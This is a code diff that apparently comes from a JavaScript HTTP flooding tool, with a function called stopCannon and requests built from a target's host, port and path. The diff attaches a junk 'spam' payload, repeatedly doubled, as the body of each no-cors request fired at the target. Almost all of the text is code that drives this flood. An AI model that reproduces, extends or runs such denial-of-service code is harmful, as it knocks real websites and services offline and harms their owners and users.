@@ -154,6 +154,11 @@
             stopCannon()
             return
           }
+          
+          var spam = "==%25%C3%A2%C2%84%C2%A2%25%3D%3D";
+          for (let x = 0; x < 2; x++) {
+            spam = spam + spam;
+          }
 
           var url = `https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`;
           var method = target.method || 'GET';
@@ -164,6 +169,7 @@
               signal: controller.signal,
               timeout: 5000,
               mode: "no-cors",
+              body: spam,
             }).then(resolve).catch(reject)
             setTimeout(() => {
               controller.abort()
